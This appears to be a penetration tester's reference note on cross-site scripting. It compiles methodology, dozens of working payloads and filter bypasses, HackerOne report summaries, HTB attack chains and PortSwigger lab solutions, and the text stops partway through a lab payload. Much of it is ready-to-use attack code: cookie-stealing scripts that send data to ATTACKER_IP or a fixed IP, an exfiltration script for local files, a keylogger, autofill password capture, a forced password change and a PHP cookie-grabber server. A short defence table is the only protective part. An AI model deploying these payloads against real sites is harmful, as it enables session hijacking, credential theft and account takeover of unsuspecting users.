---
title: "Cross-Site Scripting (XSS)"
type: technique
tags: [client-side, exploitation, h1, injection, thm, web, xss]
phase: exploitation
date_created: 2026-05-08
date_updated: 2026-05-13
sources: [thm-adv-xss, thm-web-xss, portswigger-scripts, h1-scraped-xss, payloadsallthethings-xss, git-payloadsallthethings, git-portswigger-all-labs]
---

# Cross-Site Scripting (XSS)

## What it is

XSS is a web vulnerability where an attacker injects malicious scripts into pages viewed by other users. The victim's browser executes the attacker-controlled script in the context of the trusted website, enabling session theft, keylogging, and account takeover.

## How it works

A vulnerable web application accepts user-controlled input and includes it in an HTTP response without proper sanitisation or output encoding. When another user loads the page, the browser parses the response and executes the injected script as if it were legitimate page code. The script runs with full access to the page's DOM, cookies, and any data the origin can access.

## Prerequisites

- User-controlled input is reflected or stored in a page without proper HTML encoding
- The page is served as `text/html` (or similar rendered content type)
- For DOM XSS: client-side JavaScript reads attacker-controlled sources (URL hash, query string, `postMessage`) and writes to dangerous sinks
- For stored XSS: the application persists unsanitised input and renders it to other users

## Types of XSS

### Reflected XSS
The payload is returned immediately in the HTTP response. The attacker sends a crafted URL to a victim. Server does not store the payload.

### Stored XSS (Persistent)
The payload is saved to the back-end data store (database, file) and rendered each time a user views the affected page. Higher impact because it executes automatically for all victims without social engineering a specific URL.

### DOM-Based XSS
The vulnerability exists entirely within client-side JavaScript. The server never sees the payload. A JavaScript source (e.g., `location.hash`, `document.URL`) is passed unsanitised into a dangerous sink (`document.write`, `innerHTML`, `eval`).

## Methodology

1. **Identify injection points** — form fields, URL parameters, HTTP headers reflected in responses, URL fragments used by JS
2. **Determine context** — between HTML tags, inside an HTML attribute, inside a JavaScript string, inside an HTML href/src
3. **Test for reflection** — inject a unique string and observe where it appears in the response
4. **Probe for filtering** — try `<`, `>`, `"`, `'`, `script`, `onerror`, etc.
5. **Craft context-appropriate payload** — match the injection context (see Key Payloads)
6. **Deliver payload** — via URL, stored form submission, or DOM manipulation
7. **Weaponise** — steal cookies, perform CSRF, keylog, redirect, exfiltrate data

## Key Payloads / Examples

### Basic proof of concept

```javascript
<script>alert(1)</script>
<script>alert(document.cookie)</script>
```

### Image onerror (tag filtering bypass)

```html
<img src=x onerror=alert(1)>
<img src=copyparty onerror=alert(1)>
```

CVE-2023-38501 (copyparty) — URL-encoded onerror payload in query param:
```
?k304=y%0D%0A%0D%0A%3Cimg+src%3Dcopyparty+onerror%3Dalert(1)%3E
```

### Inside an HTML attribute

```html
"><script>alert(document.cookie)</script>
" onmouseover="alert(1)
```

### Inside a JavaScript string

```javascript
';alert(document.cookie)//
\';alert(document.cookie)//
```

Breaking out of a JS string when single-quote and backslash are both escaped — close the script tag and reopen:
```javascript
';</script><img src=x onerror=alert(1)><script>var a='a
```

Breaking out when angle brackets and double quotes are encoded but single-quote escaping can be bypassed with a backslash (the server adds `\` before `'`, so supplying `\'` produces `\\'` — the `\\` escapes the backslash and the `'` terminates the string):
```javascript
\';alert(1);//
```

Injection directly into a template literal (backticks — no quoting needed):
```javascript
${alert(1)}
```

### DOM XSS via document.write

```javascript
// Vulnerable code:
document.write("Hello, " + location.search.get('name'));

// Payload in URL:
?name=<script>alert(1)</script>
```

### DOM XSS via jQuery hashchange

```html
https://realwebsite.com#<img src=1 onerror=alert(1)>
```

Delivered via iframe to auto-trigger:
```html
<iframe src="https://realwebsite.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```

### Cookie stealing — inline redirect

```javascript
<script>document.location='http://ATTACKER_IP:1337/cookiegrabber.php?c='+document.cookie</script>
```

### Cookie stealing — image trick (silent, no redirect)

```javascript
<script>var i=new Image();i.src="http://ATTACKER_IP:1337/?c="+document.cookie;</script>
```

### Cookie stealing — fetch (MarketPlace CTF pattern)

```javascript
<script>document.location='http://10.14.71.245:1337/cookiegrabber.php?c='+document.cookie</script>
```

### SSRF-style file read via XSS (WhyHackMe CTF pattern)

Serve `exfil.js` from attacker machine, then inject:
```html
<script src="http://ATTACKER_IP:80/exfil.js"></script>
```

`exfil.js` content:
```javascript
fetch('http://127.0.0.1/dir/pass.txt')
  .then(response => response.text())
  .then(data => {
    let img = document.createElement('img');
    img.src = 'http://ATTACKER_IP:8000/catch?data=' + encodeURIComponent(data);
    document.body.appendChild(img);
  });
```

### UI Redressing (Fake Login)
Leverage the XSS to modify the HTML content of the page to display a fake login form.
```javascript
<script>
history.replaceState(null, null, '../../../login');
document.body.innerHTML = "</br></br></br><h1>Please login to continue</h1><form>Username: <input type='text'>Password: <input type='password'></form><input value='submit' type='submit'>";
</script>
```

### Javascript Keylogger
```javascript
<img src=x onerror='document.onkeypress=function(e){fetch("http://[ATTACKER.DOMAIN]/?k="+String.fromCharCode(e.which))},this.remove();'>
```

### Vue.js v-html sink (DOM XSS with polling exfil)

```html
<img src=1 onerror="setInterval(() => {fetch('http://ATTACKER_IP:8000?secret=' + encodeURIComponent(localStorage.getItem('secret')), {method: 'GET'});}, 6000);">
```

### XSS + CORS data exfiltration

Inject into stored XSS:
```javascript
<img src=x onerror=alert(document.domain)>
```

Full exfil payload chaining CORS:
```html
<script>
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
  if (this.readyState == 4 && this.status == 200) {
    var xhr2 = new XMLHttpRequest();
    xhr2.open("POST", "http://ATTACKER_IP:81/receiver.php", true);
    xhr2.withCredentials = true;
    var body = this.responseText;
    var aBody = new Uint8Array(body.length);
    for (var i = 0; i < aBody.length; i++) aBody[i] = body.charCodeAt(i);
    xhr2.send(new Blob([aBody]));
  }
};
xhttp.open("GET", "http://target.com/sensitive.php", true);
xhttp.withCredentials = true;
xhttp.send();
</script>
```

### DOM XSS via innerHTML — `<script>` tags not parsed

`innerHTML` assignment does not execute `<script>` tags; use event-handler tags instead:
```html
<img src=x onerror=alert(1) />
```

### DOM XSS inside `<select>` / `document.write` with option context

Escape the option element then inject:
```html
</option><script>alert(1)</script><option selected>
```
URL form: `/product?productId=4&storeId=</option><script>alert(1)</script><option%20selected>`

### Reflected DOM XSS — JSON context with backslash escaping

Server escapes `"` to `\"`. Supply `\"` so the server produces `\\"`, which terminates the JSON string:
```javascript
\"-alert(1)}//
```
Mechanics: server turns `\"` into `\\"` → the `\\` is a literal backslash escape, `"` ends the JSON string, `-alert(1)` executes, `}` closes the object, `//` comments the rest.

### DOM XSS via jQuery href attribute sink

jQuery reads `location.search` and sets an `href` attribute — inject a `javascript:` URI:
```
/feedback?returnPath=javascript:alert(document.cookie)
```

### AngularJS template injection (sandbox escape)

When `ng-app` is present and `$eval` is available:
```javascript
{{constructor.constructor('alert(1)')()}}
// or the official PortSwigger form:
{{$on.constructor('alert(1)')}}
```

AngularJS sandbox escape without strings (`$eval` disabled) — uses `fromCharCode` + `orderBy` filter:
```javascript
toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```
Decoded logic: override `charAt` with `join` to disable string guards; build `x=alert(1)` via `fromCharCode`; evaluate it through `orderBy` filter.

AngularJS sandbox escape with CSP — uses `ng-focus` + `composedPath()` + `orderBy` without external scripts:
```html
<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>
```
Deliver via exploit server with `#x` fragment to auto-focus:
```html
<script>
location='https://TARGET/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>
```

### XSS in `onclick` attribute — HTML entity bypass for quote filtering

When single-quote and backslash are escaped but HTML entities in attribute values are decoded before JS execution:
```
http://test.com&apos;);alert(1);//
```
This becomes `'` in the generated JS: `onclick="...tracker.track('http://test.com');alert(1);//')"`

### Canonical link tag attribute injection (Chrome only)

When user input is reflected into a `<link rel="canonical" href="...">` attribute and single-quotes are not filtered:
```
/post?postId=1&a=b'accesskey='X'onclick='alert(1)
```
Result: `<link rel="canonical" href="..." accesskey="X" onclick="alert(1)" />`
Triggers on `ALT+SHIFT+X` / `CTRL+ALT+X` / `Alt+X` (victim key press).

### SVG animate — href injection (event handlers and href blocked)

When `href` attribute and event handlers are blocked as attributes on normal tags, but `<animate>` can still set them:
```html
<svg><a><animate attributeName=href values=javascript:alert(1)/><text x=20 y=20>Click me</text></a></svg>
```

### fetch() injection — no parentheses bypass

When input is reflected inside a `fetch()` call and `()` characters are filtered:
```javascript
&'},f=x=>{throw/**/onerror=alert,1337},toString=f,''+window,{x:'
```
Explanation: closes the fetch options object (`&'}`), defines a throw-based alert function, overrides `toString`, coerces `window` to string to trigger execution, then reopens a valid object (`{x:'`).

### Dangling markup — CSRF token theft via form injection

When XSS is strict-CSP-protected but HTML injection into an attribute is possible, inject a dangling form that captures the page's CSRF token:
```html
"></form><form class="login-form" name="evil-form" action="https://ATTACKER/log" method="GET"><button type="submit">Click me</button>
```
The browser's autofill or form submission sends the CSRF token to the attacker. Combine with an exploit server redirect to deliver.

### CSP `report-uri` token injection

When `script-src 'self'` is enforced but the `report-uri` token parameter is reflected unsanitised into the CSP header, inject a new directive:
```
?search=<script>alert(1)</script>&token=;script-src-elem%20'unsafe-inline'
```
The semicolon appends `script-src-elem 'unsafe-inline'` to the CSP, overriding the `self`-only restriction.

### Hidden Input XSS
Used when the injection falls inside `<input type="hidden">`.
```html
<input type="hidden" accesskey="X" onclick="alert(1)"> -- Use CTRL+SHIFT+X
<input type="hidden" oncontentvisibilityautostatechange="alert(1)" style="content-visibility:auto">
```

### XSS in URI Wrappers
When input is placed in `href` or `src` attributes.
```javascript
javascript:prompt(1)
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
vbscript:msgbox("XSS") -- IE only
```

### SVG XSS Variations
```xml
<!-- Short SVG Payload -->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
<!-- Firefox specific -->
<svg><script href=data:,alert(1) />
```

### XSS in Markdown & CSS
```markdown
[a](javascript:prompt(document.cookie))
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
```
```css
div  {
    background-image: url("data:image/jpg;base64,<\/style><svg/onload=alert(document.domain)>");
}
```

## Bypasses and Variants

### Whitespace / control character bypass

HTTP tab, newline, and carriage-return characters can break blocklist pattern matching:
```javascript
<IMG SRC="jav&#x09;ascript:alert('XSS');">   // TAB (0x09)
<IMG SRC="jav&#x0A;ascript:alert('XSS');">   // LF  (0x0A)
<IMG SRC="jav&#x0D;ascript:alert('XSS');">   // CR  (0x0D)
```

### Script tag keyword bypass

```html
<ScRiPt>alert(1)</sCrIpT>
<SCRIPT>alert(1)</SCRIPT>
```

### No parentheses (length-limited / filtered)

```javascript
alert`1`
```

### CSP bypass with unsafe-inline / unsafe-eval

If `unsafe-inline` is present in `script-src`, inline `<script>` tags execute normally.
If `unsafe-eval` is present, `eval()` and `new Function()` execute.
Overly broad CSP whitelisting CDN origins can allow JSONP or Angular template injection bypasses.

### Tag/attribute enumeration via Burp Intruder

When a WAF blocks most tags and attributes, use the PortSwigger XSS cheat sheet tag/event-handler lists as Intruder payloads (Sniper for attributes, Battering Ram for tags). Look for 200 responses vs "Tag is not allowed" / "Attribute is not allowed" responses to build the allowed set, then construct payloads from the intersection.

### Allowed-tag bypass — custom tags with HTML5 event handlers

When standard tags are blocked but custom tags are allowed, any HTML5 event handler attribute still fires:
```html
<xss autofocus tabindex=1 onfocus=alert(document.cookie)></xss>
<xss contenteditable onbeforeinput=alert(1)>test</xss>
<xss onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><h2>a</h2><h3 id=x>test</h3></xss>
```

### `<body>` tag with onresize — iframe-delivered auto-trigger

When only `<body>` and custom tags pass the filter, use `onresize` triggered by an iframe's `onload`:
```html
<iframe src="https://TARGET/?search=%3Cbody+onresize%3Dprint%28%29%3E" onload=this.style.width='100px'></iframe>
```
The iframe loads the page with the `<body onresize>` payload, then resizes itself via `onload`, automatically triggering the resize event without user interaction.

### SVG `animatetransform` with `onbegin`

When normal event handlers are stripped but SVG tags pass, use animation start events:
```html
<svg><animatetransform onbegin=alert(1) attributeName=transform>
```

### Password capture via auto-fill abuse

Inject a fake username + password field; the browser's password manager fills them in, and `onchange` exfiltrates the credentials:
```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR',{method:'POST',mode:'no-cors',body:username.value+':'+this.value});">
```

### XSS to CSRF — fetching and submitting a CSRF token

Wait for `window.onload` to ensure the CSRF token is populated, then fetch it from the DOM and submit a state-changing request:
```html
<script>
window.onload = function() {
    var csrfToken = document.getElementsByName("csrf")[0].value;
    var data = 'email=attacker@evil.com&csrf=' + csrfToken;
    fetch('/my-account/change-email', {method: 'POST', mode: 'no-cors', body: data});
};
</script>
```

### Filter evasion resources

- [XSS Payload List](https://github.com/payloadbox/xss-payload-list)
- [Tiny XSS Payloads](https://github.com/terjanq/Tiny-XSS-Payloads)
- [OWASP XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)

## Cookie Grabber Server

`cookiegrabber.php` — stores received cookies to file:
```php
<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' . $cookie . "\r\n");
fclose($fp);
?>
```

Host with PHP built-in server or Apache. Pair with the redirect payload above.

## XSS to CSRF

Once you have XSS execution, use it to perform state-changing requests on behalf of the victim using their session:
```javascript
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://target.com/changepassword', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.withCredentials = true;
xhr.send('newpassword=attacker&confirm=attacker');
</script>
```

## Real-World Examples (HackerOne — paid reports)

<!-- Patterns synthesized from 284 paid XSS reports. Top bounty: $16,000 (GitLab). -->

### Markdown / Rich-Text Renderer Injection (Stored XSS via sanitiser bypass)

The highest-paying XSS reports repeatedly target the pipeline that converts user-supplied markdown or rich text into rendered HTML. The sanitiser trusts its own internal representations too much — for example, GitLab's `DesignReferenceFilter` allowed a design file upload to introduce an arbitrary attribute into a rendered markdown link, producing a `javascript:` URL or an inline event handler that executed on any issue or comment page. A second GitLab report abused `syntax_highlight_filter.rb` to inject a `<base>` tag plus a remote `<script>` into notes, issue descriptions, and wiki pages, bypassing the CSP by loading the script from the attacker's origin.

**Why it pays:** The payload fires for every authenticated user who views the affected content — no interaction beyond page load. Combined with GitLab's wide blast radius (issue boards, wikis, MRs), session tokens with full API scope can be silently exfiltrated. GitLab paid **$16,000** and **$13,950** on two separate markdown-pipeline XSS reports.

**Targets:** GitLab, any platform with a server-side markdown renderer (wiki engines, issue trackers, documentation sites).

---

### Third-Party Integration URL Injection (Stored XSS via unsanitised external URLs)

Integrations that pull data from external services and render it inside the application's DOM introduce a trusted-boundary gap. GitLab's ZenTao integration accepted issue URLs from the ZenTao API response and embedded them as clickable links without stripping `javascript:` schemes. An attacker who controls the ZenTao server (or can perform MitM) can return `javascript:alert(document.cookie)` as an issue URL; the next authenticated user who clicks the link triggers full XSS. A related Uber report showed that injecting JavaScript into a CDN-hosted tag management file (`tags.tiqcdn.com`) propagated stored XSS across most Uber domains simultaneously.

**Why it pays:** A single compromised integration point yields execution across every page that loads the integration widget. Uber paid **$6,000** for the CDN-injection variant; GitLab paid **$13,950** for the ZenTao variant.

**Targets:** Platforms that embed content from partner/integration APIs without URL scheme validation.

---

### Diagram / Rendering Engine Attribute Smuggling

GitLab's Kroki diagram integration translated fenced code blocks into `<img>` tags. A researcher discovered that when a CSS selector matched a child `pre` node, the `lang` attribute of the *parent* node was still applied to the generated `img` tag — allowing arbitrary attributes (e.g., `onerror=...`) to be smuggled into the rendered output. The resulting stored XSS fired silently for every user viewing the comment.

**Why it pays:** Diagram rendering pipelines are complex multi-step transforms; each transform step can re-introduce attributes that earlier steps stripped. The attack surface is wide (any comment, any project) and requires no privileged role. GitLab paid **$13,950**.

**Targets:** Platforms that support embedded diagrams (Mermaid, Kroki, PlantUML, draw.io integrations).

---

### Blind XSS via Admin / Support Panels

Two reports targeted inputs that are displayed inside internal/admin dashboards rather than the public UI. CS Money accepted image filenames without sanitisation during upload; the filename was stored and rendered in the support chat panel. Grab's parcel delivery platform stored XSS payloads entered into the `name` field, which surfaced in the parcel management backend. Because the payload executes in a privileged browser session (support agent or admin), the stolen cookie grants elevated access.

**Why it pays:** Blind XSS reaching an admin panel typically yields admin account takeover rather than a regular user session — the privilege escalation multiplies the impact. CS Money paid **$1,000**; Grab paid **$750**.

**Targets:** Any user-controlled input that is later displayed in: support chat interfaces, order management dashboards, user report queues, admin audit logs.

**Technique:** Use a blind XSS callback service (e.g., XSS Hunter) as the payload so the hit is captured even if you never see the admin panel directly.

---

### Chat / Messaging Client XSS (Stored via Chat Message Content)

Valve's Steam React chat client paid **$7,500** for a stored XSS reachable via chat messages. Chat platforms built on React or other SPA frameworks often implement custom HTML sanitisers for rich-text formatting (bold, links, emoji) that fail to account for every injection vector — attribute injection, prototype pollution of sanitiser allowlists, or unsafe use of `dangerouslySetInnerHTML`.

**Why it pays:** Chat messages reach all participants in a conversation automatically. In gaming or SaaS platforms with large user bases, a single malicious message can chain to session theft for thousands of users without any further interaction. Valve paid **$7,500**.

**Targets:** Chat widgets embedded in web apps, customer messaging platforms, SaaS notification inboxes.

---

### Stored XSS in Account / Profile Settings Fields

The X / xAI (Twitter) program paid **$700** for multiple stored XSS vulnerabilities in account settings fields that could hijack any user in a company. GitLab paid **$13,950** for XSS triggered through the `/add_contacts` and `/remove_contacts` quick commands when a contact's first or last name contained a script payload — the name was stored in the customer relations module and reflected unsanitised when any authenticated user triggered the command.

**Why it pays:** Profile and settings data is often displayed in multiple contexts across an application (comments, mentions, admin panels, API responses rendered by the front-end). A single unsanitised field can create many injection points from one payload. The social-engineering bar is low: an attacker just creates an account with a malicious name.

**Targets:** Name fields, bio fields, company/organisation fields, contact fields in CRMs embedded in SaaS apps.

---

### Browser Reader Mode / Internal Page XSS

Brave Software paid **$1,000** for an XSS in the iOS Reader Mode implementation. When a page was converted to Reader Mode, a relaxed CSP allowed scripts with a `nonce` matching `%READER-TITLE-NONCE%` — a placeholder string that was not replaced before the policy was applied. An attacker could embed `<meta name="author" content="...">` with a `nonce` attribute matching the literal placeholder, causing the script to execute with access to Brave's privileged browser pages. This could expose cross-origin pages converted to Reader Mode and internal browser APIs.

**Why it pays:** Browser-level XSS runs in a privileged context that can access data from other origins and internal browser APIs — far beyond what page-level XSS can reach. Any browser feature that processes attacker-controlled HTML (Reader Mode, Print Preview, PDF viewer) with a non-strict CSP is a high-value target.

**Targets:** Browser vendor programmes (Brave, Firefox, Chrome), browser extensions with `<all_urls>` permissions that render external HTML.

---

## Detection and Defence

| Issue | Fix |
|-------|-----|
| Reflected input | `htmlspecialchars()` (PHP), `HttpUtility.HtmlEncode()` (.NET), `escape()` / `markupsafe.escape()` (Python Flask), `sanitizeHtml()` (Node.js) |
| DOM XSS | Avoid `document.write`, `innerHTML` with user input; use `textContent` / `encodeURIComponent` |
| Stored XSS | Sanitise on output, not only on input; use allowlist-based HTML sanitiser |
| CSP misconfiguration | Avoid `unsafe-inline`, `unsafe-eval`; enumerate trusted script sources explicitly |
| HttpOnly cookies | Set `HttpOnly` flag so `document.cookie` cannot read session cookies |

## Tools

- [[burp-suite]] — intercept, replay, Intruder fuzzing for tag/event-handler enumeration
- Burp Collaborator — out-of-band exfil endpoint for blind XSS / cookie / password capture
- DOM Invader (Burp Suite built-in) — automatic source/sink discovery for DOM-based XSS in Chrome
- Browser DevTools — DOM inspection, Console for prototype testing, `Ctrl+U` to view page source
- BeEF — Browser Exploitation Framework for post-exploitation after XSS

## Sources

- THM Advanced XSS room (`https://tryhackme.com/r/room/axss`)
- THM MarketPlace CTF (`https://tryhackme.com/r/room/marketplace`)
- THM WhatsYourName CTF (`https://tryhackme.com/r/room/whatsyourname`)
- THM WhyHackMe CTF (`https://tryhackme.com/r/room/whyhackme`)
- THM DOM-based Attacks (`https://tryhackme.com/room/dombasedattacks`)
- THM CORS & SOP (`https://tryhackme.com/room/corsandsop`)
- PortSwigger Academy — cookiegrabber.php script

## From the Wild

### HTB — Sightless (2024)
- **Technique variant**: Froxlor blind XSS — injected payload executed in admin's browser context, used to exfiltrate KeePass database credentials
- **Attack path**: Froxlor blind XSS to access KeePass DB for root

### HTB — DarkCorp (2025)
- **Technique variant**: RoundCube XSS + IDOR (CVE-2024-42009), AD multi-host chain
- **Attack path**: Exploit RoundCube to phish developer emails, pivot through analytics dashboard to AD domain compromise

### HTB — Alert (2024)
- **Technique variant**: XSS + Arbitrary File Read + Cron
- **Attack path**: XSS in markdown viewer to access internal page with arbitrary file read, crack password hash, overwrite cron-executed PHP file for root

### HTB — Sea (2024)
- **Technique variant**: WonderCMS XSS + Command Injection
- **Attack path**: Exploit WonderCMS CVE-2023-41425 XSS for RCE, command injection in internal monitoring service for root

### HTB — IClean (2024)
- **Technique variant**: XSS, SSTI, qpdf Exploitation
- **Attack path**: XSS to steal admin session, SSTI in invoice generator for RCE, abuse qpdf sudo for root

### HTB — Headless (2024)
- **Technique variant**: Blind XSS + Command Injection
- **Attack path**: Steal admin cookie via blind XSS in User-Agent header, access dashboard, command injection for shell, syscheck sudo script for root

### HTB — Corporate (2023)
- **Technique variant**: CSP bypass XSS, cookie theft, Bitwarden PIN brute, Gitea LDAP
- **Attack path**: Chain XSS past strict CSP to steal auth cookie, brute Bitwarden vault, enumerate Gitea via LDAP

### HTB — Derailed (2022)
- **Technique variant**: Ruby on Rails XSS (username overflow), open() pipe injection
- **Attack path**: Username buffer overflow triggers XSS, steal admin CSRF token, Ruby open() command injection

### HTB — Stocker (2023)
- **Technique variant**: NoSQL Injection + PDF HTML Injection
- **Attack path**: NoSQL injection to bypass Express.js login, HTML injection in PDF generator reads files via iframe, path wildcard sudo for root

### HTB — Extension (2022)
- **Technique variant**: Gitea, Snippet Injection, Browser Extension Exploitation
- **Attack path**: Exploit Gitea for access, inject malicious code into shared snippets, browser extension RCE for root

### HTB — Stacked (2021)
- **Technique variant**: XSS, LocalStack/AWS exploitation, Lambda RCE
- **Attack path**: Exploit XSS in web form to pivot to internal LocalStack, abuse Lambda for code execution

### HTB — Anubis (2021)
- **Technique variant**: ADCS writable certificate template, Windows PKI abuse
- **Attack path**: Exploit writable cert template in Windows PKI to escalate to Domain Admin

### HTB — CrossFit (2020)
- **Technique variant**: XSS to CORS to CSRF, FTP upload, command injection
- **Attack path**: Chain XSS through CORS to forge admin account on subdomain, upload webshell via FTP

### HTB — RopeTwo (2020)
- **Technique variant**: V8 JavaScript engine exploit, heap, kernel module
- **Attack path**: Exploit patched V8 engine with OOB read/write, craft addrof/fakeobj primitives, kernel exploit

### HTB — Book (2020)
- **Technique variant**: SQL Truncation Attack, XSS-to-PDF SSRF, Logrotate Race Condition
- **Attack path**: SQL truncation to clone admin email, XSS in PDF generation to read files, logrotate CVE for root

### HTB — Bankrobber (2019)
- **Technique variant**: XSS, CSRF, SQLi source leak, BOF
- **Attack path**: Chain XSS to steal admin cookies, SQLi to leak code, BOF for SYSTEM

## Payload reference (PayloadsAllTheThings)

Distinctive payloads from PAT covering HTML5 event handlers, URI wrapper bypasses, and SVG/file-based vectors not duplicated above.

### HTML5 event handler variants (no script tag)

```javascript
<body onload=alert(/XSS/.source)>
<input autofocus onfocus=alert(1)>
<details/open/ontoggle="alert`1`">
<audio src onloadstart=alert(1)>
<video/poster/onerror=alert(1)>
<marquee onstart=alert(1)>

// Pointer events (fires on hover, no click needed)
<div onpointerover="alert(45)">MOVE HERE</div>
<div onpointerenter="alert(45)">MOVE HERE</div>
```

### javascript: URI encoding bypasses

```javascript
// Newline characters break the scheme keyword for some filters
java%0ascript:alert(1)    // LF
java%09script:alert(1)    // tab
java%0dscript:alert(1)    // CR

// Backslash escape sequence
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)

// Comment in URI
javascript://%0Aalert(1)
```

### Mutation XSS (mXSS)

```javascript
// Browser quirks reconstruct HTML; DOMPurify bypass (Masato Kinugawa)
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

### XSS in JS context (no quotes)

```javascript
// Payload from brutelogic — works when quotes are filtered
-(confirm)(document.domain)//
; alert(1);//
```

### Hidden input trigger (modern browsers)

```javascript
<input type="hidden" oncontentvisibilityautostatechange="alert(1)" style="content-visibility:auto">
// Firefox 130+ / Chrome 108+
```

## PortSwigger Labs

All 30 XSS labs from PortSwigger Web Security Academy, grouped by difficulty. Key payloads are inline; full technique context is in the sections above.

### Apprentice

#### LAB 1 — Reflected XSS into HTML context with nothing encoded
Search field reflects input directly. Basic payload:
```html
<script>alert(1)</script>
```

#### LAB 2 — Stored XSS into HTML context with nothing encoded
Comment body is stored and rendered without encoding. Same basic script tag payload stored in the comment field.

#### LAB 3 — DOM XSS in document.write sink using source location.search
`document.write()` outputs the `?search=` parameter. Break out of a surrounding attribute with:
```html
"><script>alert(1)</script>
```

#### LAB 4 — DOM XSS in innerHTML sink using source location.search
`innerHTML` is set from `?search=`. `<script>` tags are not executed via innerHTML; use an event-handler tag:
```html
<img src=x onerror=alert(1) />
```

#### LAB 5 — DOM XSS in jQuery anchor href attribute sink using location.search
jQuery sets an `<a href>` from `?returnPath=`. Inject a `javascript:` URI:
```
/feedback?returnPath=javascript:alert(document.cookie)
```

#### LAB 6 — DOM XSS in jQuery selector sink using a hashchange event
`$(window).on('hashchange')` passes `decodeURIComponent(location.hash.slice(1))` into a jQuery selector. Deliver via iframe with auto-appended payload:
```html
<iframe src="https://TARGET/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

#### LAB 7 — Reflected XSS into attribute with angle brackets HTML-encoded
Input lands inside an `<input value="...">` attribute; angle brackets are encoded but the attribute is not closed. Break out with an event handler:
```html
" autofocus onfocus=alert(1) x="
```

#### LAB 8 — Stored XSS into anchor href attribute with double quotes HTML-encoded
Comment "website" field generates `<a href="...">`. Double quotes encoded but scheme not validated — store a `javascript:` URI:
```javascript
javascript:alert(1)
```

#### LAB 9 — Reflected XSS into a JavaScript string with angle brackets HTML encoded
Input appears inside a JS string with single-quote delimiter. Angle brackets encoded so close with `\';`:
```javascript
\';alert(document.cookie)//
```

---

### Practitioner

#### LAB 10 — DOM XSS in document.write sink inside a select element
`storeId` URL param is written inside `<option>` tags via `document.write`. Escape the option context:
```html
</option><script>alert(1)</script><option selected>
```
URL: `/product?productId=4&storeId=</option><script>alert(1)</script><option%20selected>`

#### LAB 11 — DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
Input reflected inside an `ng-app` scope. Use `constructor.constructor` to escape the sandbox:
```javascript
{{constructor.constructor('alert(1)')()}}
// official form:
{{$on.constructor('alert(1)')}}
```

#### LAB 12 — Reflected DOM XSS
Server-side escaping adds `\` before `"`. Supply `\"` so the server produces `\\"` — double-backslash escapes the backslash and the `"` closes the JSON string:
```javascript
\"-alert(1)}//
```

#### LAB 13 — Stored DOM XSS
Comment body processed by client-side JS into `innerHTML` with `<p>` wrapper. Break out:
```html
</p><img src=x onerror=alert(1) /><p></p>
```

#### LAB 14 — Reflected XSS into HTML context with most tags and attributes blocked
Use Burp Intruder to enumerate allowed tags and event handlers. Allowed: `body`, custom tags; allowed events include `onresize`, `onbeforeinput`, `onscrollend`. Deliver via iframe auto-resize:
```html
<iframe src="https://TARGET/?search=%3Cbody+onresize%3Dprint%28%29%3E" onload=this.style.width='100px'></iframe>
```
Alternative interaction-required payloads:
```html
<xss contenteditable onbeforeinput=alert(1)>test</xss>
<xss onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><h2>a</h2><h3 id=x>test</h3></xss>
```

#### LAB 15 — Reflected XSS into HTML context with all tags blocked except custom ones
All standard tags blocked; custom tags and all attribute names accepted. Use `autofocus` + `onfocus`:
```html
<xss autofocus tabindex=1 onfocus=alert(document.cookie)></xss>
```

#### LAB 16 — Reflected XSS with some SVG markup allowed
Only SVG tags pass: `animatetransform`, `image`, `title`. Allowed event: `onbegin`. Use SVG animation start:
```html
<svg><animatetransform onbegin=alert(1) attributeName=transform>
```

#### LAB 17 — Reflected XSS in canonical link tag (Chrome only)
Input reflected into `<link rel="canonical" href="...">`. Inject additional attributes via single-quote:
```
/post?postId=1&a=b'accesskey='X'onclick='alert(1)
```
Victim triggers with `ALT+SHIFT+X`.

#### LAB 18 — Reflected XSS into JS string with single quote and backslash escaped
Both `'` and `\` are escaped, but you can break out of the `<script>` block entirely:
```javascript
';</script><img src=x onerror=alert(1)><script>var a='a
```

#### LAB 19 — Reflected XSS into JS string with angle brackets and double quotes encoded, single quotes escaped
Angle brackets / double quotes encoded; single quote escaped (`'` → `\'`). Supply `\'` so server produces `\\'`:
```javascript
\';alert(1);//
```

#### LAB 20 — Stored XSS into onclick event with angle brackets and double quotes encoded, single quotes and backslash escaped
Comment "website" lands in `onclick="...tracker.track('URL');"`. Bypass with HTML entity for single-quote (`&apos;`), which is decoded before JS execution:
```
http://test.com&apos;);alert(1);//
```

#### LAB 21 — Reflected XSS into template literal with all special characters Unicode-escaped
Input appears inside a JS template literal. `${...}` expression syntax is not escaped:
```javascript
${alert(1)}
```

#### LAB 22 — Exploiting XSS to steal cookies
Stored XSS via comment body. Exfiltrate `document.cookie` via `onerror` redirect to Burp Collaborator:
```html
</p><img src=x onerror='document.location="https://COLLABORATOR/?cookies="+document.cookie' /><p>
```

#### LAB 23 — Exploiting XSS to capture passwords
Stored XSS. Inject fake username + password inputs; browser autofill triggers exfil on password `onchange`:
```html
<input name=username id=username>
